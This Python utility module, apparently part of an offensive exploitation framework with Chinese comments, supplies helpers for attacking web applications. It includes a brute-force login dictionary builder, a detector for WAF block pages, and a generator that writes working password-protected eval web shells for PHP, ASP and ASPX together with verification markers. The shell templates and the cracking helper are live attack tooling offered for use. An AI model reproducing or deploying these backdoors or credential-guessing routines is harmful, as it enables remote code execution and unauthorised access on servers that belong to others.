import os
import re
import json
import base64 as b64
import random
import string
from flashtext import KeywordProcessor


def build_random_str(length=8):
    """ 随机字符串 """

    return ''.join(random.sample(string.ascii_letters, length))


def build_random_lower_str(length=8):
    """ 随机小写字符串 """

    return ''.join(random.sample(string.ascii_lowercase, length))


randomLowercase = build_random_lower_str


def build_random_upper_str(length=8):
    """ 随机大写字符串 """

    return ''.join(random.sample(string.ascii_uppercase, length))


randomUppercase = build_random_upper_str


def build_random_int(min_length=8, max_length=16):
    """ 随机整数 """

    return random.randint(min_length, max_length)


randomInt = build_random_int

base64 = b64.b64encode


def jsonp_to_json(jsonp_str):
    """ jsonp转json """

    return json.loads(re.match(".*?({.*}).*", jsonp_str, re.S).group(1))


def is_exist_waf(content):
    """" 判断waf """
    kp = KeywordProcessor()
    kp.add_keywords_from_list(
        [
            "安全拦截",
            "攻击行为",
            "安全威胁",
        ]
    )
    for keyword in kp.extract_keywords(content):
        return True
    return False


def build_login_dict(method=1, username='admin', password='admin'):
    """ 构建口令破解字典 """
    if os.path.isfile(username):
        with open(username, encoding='utf-8') as f:
            username_list = [line.strip() for line in f]
    elif isinstance(username, str):
        username_list = username.split(',')
    else:
        raise Exception('username not found!')

    if os.path.isfile(password):
        with open(password, encoding='utf-8') as f:
            password_list = [line.strip() for line in f]
    elif isinstance(password, str):
        password_list = password.split(',')
    else:
        raise Exception('password not found!')

    if method == 0:
        return username_list, password_list
    elif method == 1 and all([isinstance(username_list, list), isinstance(password_list, list)]):
        if len(username_list) != len(password_list):
            raise Exception('单点登录模式: 账密数量不一致')
        for username, password in zip(username_list, password_list):
            yield username, password
    elif method == 2 and all([isinstance(username_list, list), isinstance(password_list, list)]):
        for username in (username_list or ['admin']):
            for password in (password_list or ['admin']):
                yield username, password
    else:
        raise Exception('login method error!')


def build_web_shell(lang='php') -> tuple:
    """ 生成WebShell """
    code, password = '', build_random_str(8)
    if lang == 'php':
        code = '<?php @eval($_POST["{}"]);?>'.format(password)
        flag = 'echo "<{}>";die();'.format(password)
    elif lang == 'asp':
        code = '<%eval request("{}")%>'.format(password)
        flag = 'Response.Write("{}")'.format(password)
    elif lang == 'aspx':
        code = '<%@ Page Language="Jscript"%><%eval(Request.Item["{}"],"unsafe");%>'.format(password)
        flag = 'Response.Write("{}")'.format(password)
    else:
        raise Exception(f'Unusable language')
    return code, password, flag
